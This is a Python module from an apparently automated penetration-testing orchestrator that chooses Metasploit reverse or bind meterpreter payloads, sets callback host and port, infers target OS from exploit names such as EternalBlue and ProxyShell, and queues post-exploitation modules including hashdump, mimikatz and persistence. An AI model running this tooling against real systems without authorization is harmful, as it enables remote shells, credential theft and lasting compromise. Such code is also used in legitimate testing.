"""Payload strategy for Metasploit exploit actions.

Chooses a workable PAYLOAD + LHOST/LPORT (or bind fallback) so reverse
sessions can actually call back into the worker/orchestrator network.
"""

from __future__ import annotations

import os
import socket
from typing import Any, Literal

OsHint = Literal["linux", "windows", "unknown"]
Prefer = Literal["reverse", "bind"]

_LINUX_REVERSE = "linux/x64/meterpreter/reverse_tcp"
_LINUX_BIND = "linux/x64/meterpreter/bind_tcp"
_WINDOWS_REVERSE = "windows/x64/meterpreter/reverse_tcp"
_WINDOWS_BIND = "windows/x64/meterpreter/bind_tcp"
_GENERIC_REVERSE = "generic/shell_reverse_tcp"
_GENERIC_BIND = "generic/shell_bind_tcp"

# Modules that are Windows-centric even when path says multi/
_WINDOWS_MODULES = (
    "windows/",
    "ms17_010",
    "eternalblue",
    "bluekeep",
    "cve_2019_0708",
    "exchange_",
    "proxyshell",
    "proxylogon",
    "proxynotshell",
    "moveit",
    "php_cgi_arg_injection",
)


def prefer_mode() -> Prefer:
    raw = (os.environ.get("FIREBREAK_PAYLOAD_PREFER") or "reverse").strip().lower()
    return "bind" if raw == "bind" else "reverse"


def detect_lhost() -> str | None:
    """Return a host the target can dial back to for reverse payloads."""
    explicit = (os.environ.get("FIREBREAK_LHOST") or "").strip()
    if explicit and explicit not in {"0.0.0.0", "::", "127.0.0.1", "localhost"}:
        return explicit

    # UDP connect trick: discovers the outbound interface IP without sending.
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            ip = sock.getsockname()[0]
            if ip and not ip.startswith("127."):
                return ip
    except OSError:
        pass

    # Docker Desktop / compose helper used by some lab setups.
    for candidate in ("host.docker.internal",):
        try:
            return socket.gethostbyname(candidate)
        except OSError:
            continue
    return None


def allocate_lport() -> int:
    start = int(os.environ.get("FIREBREAK_LPORT_START") or "4444")
    start = max(1024, min(start, 65000))
    # Prefer an ephemeral free port at/above the configured start.
    for port in range(start, min(start + 200, 65535)):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind(("0.0.0.0", port))
                return port
        except OSError:
            continue
    return start


def infer_os(module: str, hint: OsHint | str | None = None) -> OsHint:
    if hint in ("linux", "windows"):
        return hint  # type: ignore[return-value]
    path = (module or "").lower()
    if any(token in path for token in _WINDOWS_MODULES):
        return "windows"
    if "linux" in path or "unix" in path or "multi/http" in path:
        return "linux"
    return "unknown"


def payload_for(os_hint: OsHint, mode: Prefer) -> str:
    if os_hint == "windows":
        return _WINDOWS_BIND if mode == "bind" else _WINDOWS_REVERSE
    if os_hint == "linux":
        return _LINUX_BIND if mode == "bind" else _LINUX_REVERSE
    return _GENERIC_BIND if mode == "bind" else _GENERIC_REVERSE


def rport_from_target(target: str) -> int | None:
    from urllib.parse import urlparse

    value = (target or "").strip()
    if "://" in value:
        parsed = urlparse(value)
        if parsed.port:
            return parsed.port
        if parsed.scheme == "https":
            return 443
        if parsed.scheme == "http":
            return 80
    return None


def resolve_exploit_options(
    module: str,
    *,
    target: str = "",
    os_hint: OsHint | str | None = None,
    existing: list[str] | None = None,
) -> list[str]:
    """
    Merge playbook/CVE option stubs with a workable payload strategy.

    Existing KEY=VALUE entries win unless they are known-broken (LHOST=0.0.0.0).
    """
    merged: dict[str, str] = {}
    for item in existing or []:
        if not isinstance(item, str) or "=" not in item:
            continue
        key, value = item.split("=", 1)
        key = key.strip().upper()
        value = value.strip()
        if not key:
            continue
        merged[key] = value

    # Strip broken reverse listener hosts from older playbooks/maps.
    if merged.get("LHOST") in {"0.0.0.0", "::", "", "127.0.0.1", "localhost"}:
        merged.pop("LHOST", None)

    os_name = infer_os(module, os_hint)
    mode = prefer_mode()
    lhost = detect_lhost()

    if mode == "reverse" and not lhost:
        mode = "bind"

    if "PAYLOAD" not in merged:
        merged["PAYLOAD"] = payload_for(os_name, mode)

    payload = merged["PAYLOAD"].lower()
    is_reverse = "reverse" in payload
    is_bind = "bind" in payload

    if is_reverse:
        if "LHOST" not in merged:
            if not lhost:
                # Last resort: switch to bind so the attempt is not doomed.
                merged["PAYLOAD"] = payload_for(os_name, "bind")
                is_reverse = False
                is_bind = True
            else:
                merged["LHOST"] = lhost
        if is_reverse and "LPORT" not in merged:
            merged["LPORT"] = str(allocate_lport())
        # Ensure Metasploit keeps its built-in handler listening.
        merged.setdefault("DisablePayloadHandler", "false")

    if is_bind and "RPORT" not in merged:
        # Bind payloads still need a service port on the target for many modules;
        # RPORT for the exploit transport is separate from payload bind port.
        pass

    if "RPORT" not in merged:
        guessed = rport_from_target(target)
        if guessed:
            merged["RPORT"] = str(guessed)

    # Stable ordering for tests / dedupe readability.
    preferred_order = (
        "PAYLOAD",
        "LHOST",
        "LPORT",
        "RPORT",
        "DisablePayloadHandler",
    )
    ordered: list[str] = []
    for key in preferred_order:
        if key in merged:
            ordered.append(f"{key}={merged.pop(key)}")
    for key in sorted(merged):
        ordered.append(f"{key}={merged[key]}")
    return ordered


def post_modules_for_session(session: dict[str, Any] | None = None) -> list[str]:
    """OS-aware post modules for an open session."""
    session = session or {}
    platform = str(
        session.get("platform") or session.get("os") or session.get("arch") or ""
    ).lower()
    session_type = str(session.get("type") or "").lower()
    desc = str(session.get("desc") or session.get("info") or "").lower()
    blob = f"{platform} {session_type} {desc}"

    if any(token in blob for token in ("linux", "unix", "posix", "ubuntu", "debian")):
        return [
            "post/linux/gather/enum_system",
            "post/linux/gather/enum_configs",
            "post/multi/gather/env",
        ]
    if any(token in blob for token in ("windows", "win32", "win64", "mingw")):
        return [
            "post/windows/gather/hashdump",
            "post/windows/gather/credentials/mimikatz",
            "post/windows/manage/persistence_exe",
        ]
    # Unknown platform: non-destructive multi gather / recon trio.
    return [
        "post/multi/gather/env",
        "post/multi/gather/checkvm",
        "post/multi/recon/local_exploit_suggester",
    ]


def strategy_meta() -> dict[str, Any]:
    return {
        "prefer": prefer_mode(),
        "lhost": detect_lhost(),
        "lport_start": int(os.environ.get("FIREBREAK_LPORT_START") or "4444"),
    }
